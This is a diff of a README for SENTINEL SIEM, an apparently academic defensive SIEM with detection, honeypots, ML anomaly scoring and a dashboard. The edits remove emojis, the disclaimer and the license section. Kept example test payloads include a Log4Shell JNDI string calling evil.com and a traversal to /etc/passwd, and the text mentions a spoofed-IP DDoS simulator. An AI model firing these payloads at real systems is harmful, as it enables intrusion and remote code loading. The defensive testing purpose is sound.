@@ -1,11 +1,11 @@
 <div align="center">
 
-<img src="https://capsule-render.vercel.app/api?type=waving&color=0:0d1117,50:1a1a2e,100:0f3460&height=200&section=header&text=SENTINEL%20SIEM&fontSize=64&fontColor=00d4ff&animation=fadeIn&fontAlignY=38&desc=Enterprise%20Security%20Information%20%26%20Event%20Management&descAlignY=58&descSize=18&descColor=94a3b8" width="100%"/>
+<img src="https://capsule-render.vercel.app/api?type=waving&color=0:0d1117,50:1a1a2e,100:0f3460&height=200&section=header&text=SENTINEL SIEM&fontSize=64&fontColor=00d4ff&animation=fadeIn&fontAlignY=38&desc=Enterprise Security Information & Event Management&descAlignY=58&descSize=18&descColor=94a3b8" width="100%"/>
 
 <p>
   <img src="https://img.shields.io/badge/Python-3.10+-3776ab?style=for-the-badge&logo=python&logoColor=white"/>
   <img src="https://img.shields.io/badge/Flask-2.3+-000000?style=for-the-badge&logo=flask&logoColor=white"/>
-  <img src="https://img.shields.io/badge/scikit--learn-ML%20Engine-f7931e?style=for-the-badge&logo=scikitlearn&logoColor=white"/>
+  <img src="https://img.shields.io/badge/scikit--learn-ML Engine-f7931e?style=for-the-badge&logo=scikitlearn&logoColor=white"/>
   <img src="https://img.shields.io/badge/SQLite-Database-003b57?style=for-the-badge&logo=sqlite&logoColor=white"/>
 </p>
 
@@ -18,19 +18,16 @@
 
 <br/>
 
-> **🎨 Experience the future of security monitoring with our intuitive, real-time SOC dashboard.**
+> **Experience the future of security monitoring with our intuitive, real-time SOC dashboard.**
 
 <div style="display: flex; justify-content: center; gap: 10px; margin: 15px 0;">
-  <img src="./images/screenshot1.png" alt="Dashboard Screenshot 1" style="width: 45%; border-radius: 8px; margin: 5px;"/>
-  <img src="./images/screenshot2.png" alt="Dashboard Screenshot 2" style="width: 45%; border-radius: 8px; margin: 5px;"/>
+  <img src="./images/screenshot1.png" alt="SENTINEL SIEM Dashboard Screenshot 1" style="width: 30%; border-radius: 8px; margin: 5px;"/>
+  <img src="./images/screenshot2.png" alt="SENTINEL SIEM Dashboard Screenshot 2" style="width: 30%; border-radius: 8px; margin: 5px;"/>
+  <img src="https://mistralaiblackforestprod.blob.core.windows.net/images/blackforest/3c60/3dab/-c05/6-49aa-a70c-9e14b4cc8518/image.jpg?se=2026-04-26T16%3A13%3A03Z&sp=r&sv=2026-02-06&sr=b&skoid=0c825961-8b13-4c3f-94c2-848b13b71a98&sktid=4fbc1168-2984-4d17-af19-ac5138c2378e&skt=2026-04-26T15%3A13%3A03Z&ske=2026-04-26T16%3A13%3A03Z&sks=b&skv=2026-02-06&sig=%2BJ7OZJvP46bZeWl6bp%2BZhsi%2B%2BVXQTcQKp54t7Av7BFs%3D"
+       alt="SENTINEL SIEM Dashboard Preview" style="width: 30%; border-radius: 8px; margin: 5px;"/>
 </div>
 
-> **🛡️ A full-stack Enterprise SIEM system with real-time threat detection, AI-powered anomaly analysis, an automated firewall, and a cinematic SOC dashboard — engineered for defensive security research.**
-
-<br/>
-
-**Engineered by [Abhay Singh Taknet](https://github.com/AbhaySinghTaknet)**
-`B.Tech Computer Science · Sobhasaria Group of Institutions, Sikar · 2025–26`
+> **A full-stack Enterprise SIEM system with real-time threat detection, AI-powered anomaly analysis, an automated firewall, and a cinematic SOC dashboard — engineered for defensive security research.**
 
 <br/>
 
@@ -42,14 +39,14 @@
 
 ```mermaid
 graph TB
-    subgraph INGESTION ["📡 Ingestion Layer"]
+    subgraph IngestionLayer ["Ingestion Layer"]
         A[Web Requests] --> B[Flask API /api/logs]
         C[Login Attempts] --> B
         D[Honeypot Traps] --> B
         E[Demo Website\nport 5050] -->|Middleware| B
     end
 
-    subgraph ANALYSIS ["🧠 Analysis Engine"]
+    subgraph AnalysisEngine ["Analysis Engine"]
         B --> F{Detection Engine\ncore/detection.py}
         F -->|Pattern Match| G[Signature DB\nSQL · XSS · CMDi\nSSRF · Log4Shell · XXE]
         F -->|Score| H[AI Anomaly Engine\ncore/ai_engine.py]
@@ -57,7 +54,7 @@ graph TB
         H -->|Rate Tracking| J[Rate Limiter\n25 req/min threshold]
     end
 
-    subgraph RESPONSE ["⚡ Response Layer"]
+    subgraph ResponseLayer ["Response Layer"]
         G --> K{Threat?}
         I --> K
         J --> K
@@ -67,25 +64,25 @@ graph TB
         L --> O[System Lockdown\nif score ≥ 90]
     end
 
-    subgraph STORAGE ["💾 Storage Layer"]
+    subgraph StorageLayer ["Storage Layer"]
         N --> P[(SQLite DB\ndb/sentinel.db)]
         M --> P
         P --> Q[Reporter\nCSV · JSON Export]
     end
 
-    subgraph DASHBOARD ["📊 SOC Dashboard"]
+    subgraph Dashboard ["SOC Dashboard"]
         P --> R[Live Chart\nReal-time Telemetry]
         P --> S[Threat Map\nGeo IP Tracking]
         P --> T[Analytics Tab\nAttack Breakdown]
         N --> U[Firewall Panel\nManual Block/Unblock]
-        O --> V[🔴 Lockdown Banner\nVault Sealed]
+        O --> V[Lockdown Banner\nVault Sealed]
     end
 
-    style INGESTION fill:#0f172a,stroke:#3b82f6,color:#94a3b8
-    style ANALYSIS fill:#0f172a,stroke:#8b5cf6,color:#94a3b8
-    style RESPONSE fill:#0f172a,stroke:#ef4444,color:#94a3b8
-    style STORAGE fill:#0f172a,stroke:#22c55e,color:#94a3b8
-    style DASHBOARD fill:#0f172a,stroke:#f59e0b,color:#94a3b8
+    style IngestionLayer fill:#0f172a,stroke:#3b82f6,color:#94a3b8
+    style AnalysisEngine fill:#0f172a,stroke:#8b5cf6,color:#94a3b8
+    style ResponseLayer fill:#0f172a,stroke:#ef4444,color:#94a3b8
+    style StorageLayer fill:#0f172a,stroke:#22c55e,color:#94a3b8
+    style Dashboard fill:#0f172a,stroke:#f59e0b,color:#94a3b8
 ```
 
 ---
@@ -96,7 +93,7 @@ graph TB
 <tr>
 <td width="50%">
 
-### 🔍 Detection Engine
+### Detection Engine
 - **8 Attack Vectors** — SQL Injection, XSS, Command Injection, Path Traversal, SSRF, Log4Shell, XXE, Brute Force
 - **Honeypot Traps** — 6 fake endpoints that auto-block any attacker who probes them (`/.env`, `/phpmyadmin`, `/admin_bypass`...)
 - **Signature + AI hybrid** — pattern matching layered with ML anomaly scoring
@@ -104,7 +101,7 @@ graph TB
 </td>
 <td width="50%">
 
-### 🤖 AI Anomaly Engine
+### AI Anomaly Engine
 - **IsolationForest ML model** — trained on live session data
 - **3-feature analysis** — risk score, threat flag, payload length
 - **Rate-based detection** — 25 req/min threshold per IP
@@ -115,7 +112,7 @@ graph TB
 <tr>
 <td width="50%">
 
-### ⚡ SOAR Firewall
+### SOAR Firewall
 - **Auto-block** on CRITICAL threats
 - **System Lockdown** when threat score ≥ 90
 - **Persistent blocklist** — survives restarts (`banned_ips.json`)
@@ -125,7 +122,7 @@ graph TB
 </td>
 <td width="50%">
 
-### 📊 SOC Dashboard
+### SOC Dashboard
 - **Real-time traffic chart** — threats vs safe, live line chart
 - **World map** — animated attack origin dots on geo-accurate map
 - **Toast notifications** — instant threat popups on new events
@@ -137,7 +134,7 @@ graph TB
 <tr>
 <td width="50%">
 
-### 🌐 Website Integration
+### Website Integration
 - **WSGI middleware** — one-line integration into any Flask/Django app
 - **Non-blocking** — background threads, zero latency impact
 - **Built-in demo site** — test attacks on a live simulated website
@@ -146,7 +143,7 @@ graph TB
 </td>
 <td width="50%">
 
-### 🎮 Attack Simulator
+### Attack Simulator
 - **Injection Tool** — SQL, XSS, Log4Shell, Path Traversal payloads
 - **Mass DDoS Botnet** — 30 concurrent threads with random IP spoofing
 - **Safe Traffic Generator** — legitimate requests for baseline data
@@ -180,7 +177,7 @@ setup.bat
 run.bat
 ```
 
-That's it. The dashboard opens automatically at `http://localhost:5000`.
+The dashboard opens automatically at `http://localhost:5000`.
 
 ---
 
@@ -189,7 +186,6 @@ That's it. The dashboard opens automatically at `http://localhost:5000`.
 ```
 ╔══════════════════════════════════════════════════════╗
 ║   SENTINEL SIEM  |  Control Panel                    ║
-║   Engineered by Abhay Singh Taknet                   ║
 ╠══════════════════════════════════════════════════════╣
 ║                                                      ║
 ║   [1]  Start SENTINEL SIEM System                    ║
@@ -201,7 +197,7 @@ That's it. The dashboard opens automatically at `http://localhost:5000`.
 ╚══════════════════════════════════════════════════════╝
 ```
 
-| Option | What it does |
+| Option | Description |
 |--------|-------------|
 | **1 — Start System** | Launches main server (5000) + Client Portal (5001), opens dashboard in browser |
 | **2 — Attack Simulator** | Sub-menu for injection attacks, mass DDoS, safe traffic generator |
@@ -220,16 +216,14 @@ from integration.sentinel_middleware import SentinelMiddleware
 
 app = Flask(__name__)
 # ... your existing code ...
-app.wsgi_app = SentinelMiddleware(app.wsgi_app)  # ← just this line
+app.wsgi_app = SentinelMiddleware(app.wsgi_app)  # One-line integration
 ```
-
-Every HTTP request to your site now gets scanned by SENTINEL automatically — in the background, without slowing down your app.
 
 ### Method 2 — Built-in Demo Site
 ```
 run.bat → [1] Start SENTINEL → [3] Launch Demo Website
 ```
-Visit `http://localhost:5050` and try attacks in the login form. Watch the dashboard react in real-time.
+Visit `http://localhost:5050` and try attacks in the login form.
 
 ### Method 3 — Direct API
 ```python
@@ -308,6 +302,10 @@ SENTINEL_SIEM/
 ├── Client_Portal/                  # Simulated client-facing web portal
 │   └── portal_app.py
 │
+├── images/                         # Dashboard screenshots
+│   ├── screenshot1.png
+│   └── screenshot2.png
+│
 ├── logs/
 │   ├── banned_ips.json             # Persistent IP blocklist
 │   ├── threat_events.txt           # Flat log — threat events
@@ -317,12 +315,10 @@ SENTINEL_SIEM/
 │   └── sentinel.db                 # SQLite database (auto-created)
 │
 ├── exports/                        # CSV/JSON reports (auto-generated)
-├── userguide & research/           # User guides and research documents
-│   ├── userguide.pdf
-│   └── research_paper.pdf
 │
-└── secure_data/
-    └── company_secrets.txt         # Vault contents (sealed during lockdown)
+└── userguide & research/           # User guides and research documents
+    ├── userguide.pdf               # User guide for SENTINEL SIEM
+    └── research_paper.pdf           # Research paper for SENTINEL SIEM
 ```
 
 ---
@@ -351,8 +347,6 @@ ${jndi:ldap://evil.com/exploit}
 -- Path Traversal
 ../../../../etc/passwd
 ```
-
-Each payload triggers a real-time response on the SENTINEL dashboard — threat feed updates, map dot animates, toast notification fires, IP gets blocked.
 
 ---
 
@@ -392,54 +386,6 @@ When 5+ CRITICAL threats are detected, SENTINEL enters full lockdown:
 
 ---
 
-## 📸 Dashboard Preview
-
-```
-┌─────────────────────────────────────────────────────────────────────┐
-│  SENTINEL          ● ALL SYSTEMS OPERATIONAL         08:51:35  SOC  │
-│  Enterprise SIEM   ──────────────────────────────────────────────── │
-│                                                                     │
-│  MONITORING        ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────┐ │
-│  ▣ Overview        │THREATS   │ │BLOCKED   │ │SAFE      │ │RISK  │ │
-│  △ Threat Feed     │    47    │ │    12    │ │   183    │ │HIGH  │ │
-│  ✓ Safe Traffic    │This sess.│ │Auto-FW   │ │Zero-Trust│ │87/100│ │
-│                    └──────────┘ └──────────┘ └──────────┘ └──────┘ │
-│  RESPONSE                                                           │
-│  ⊘ SOAR/Firewall   ┌──────────────────────┐ ┌────────────────────┐ │
-│  🔒 Secure Vault   │ Real-time Telemetry  │ │ Threat Origin Map  │ │
-│                    │  ▓▓░░▓▓▓░▓▓░░░▓▓▓░░  │ │  🌍  ●  ●     ●   │ │
-│  SYSTEM            │  red=threat grn=safe  │ │    ●       ●  ●   │ │
-│  📊 System Health  └──────────────────────┘ └────────────────────┘ │
-│  📈 Analytics                                                       │
-│  ──────────────    ┌─────────────────────────────────────────────┐  │
-│  SENTINEL SIEM     │ Recent Threat Events                        │  │
-│  Engineered by     │ CRITICAL │ 68.178.74.1  │ SQL_Injection ... │  │
-│  Abhay Singh Taknet│ HIGH     │ 176.209.134  │ XSS_Attack + ...  │  │
-└─────────────────────────────────────────────────────────────────────┘
-```
-
----
-
-## 🤝 Contributing
-
-Pull requests are welcome. For major changes, open an issue first to discuss what you'd like to change.
-
----
-
-## ⚠️ Disclaimer
-
-SENTINEL SIEM is built **strictly for defensive security research, academic study, and authorized penetration testing environments**. The attack simulators included are for testing the detection engine against a local controlled setup only.
-
-Do **not** use any component of this project against systems you do not own or have explicit written permission to test.
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License.
-
----
-
 <div align="center">
 
 <!-- FOOTER WAVE -->
@@ -447,13 +393,11 @@ This project is licensed under the MIT License.
 
 <br/>
 
-**Built with 🛡️ by Abhay Singh Taknet**
-
-`SENTINEL SIEM · Enterprise Threat Detection · v2.0`
+**Built by Abhay Singh Taknet**
 
 ---
 
-### 📩 Contact & Detailed Reading
+### Contact & Detailed Reading
 📧 **Email:** abhaytaknet@gmail.com
 🔗 **LinkedIn:** [www.linkedin.com/in/abhay-singh-551aa6325](www.linkedin.com/in/abhay-singh-551aa6325)
 📄 **Research Paper:** [SENTINEL SIEM Research Paper](./userguide%20&%20research/research_paper.pdf)
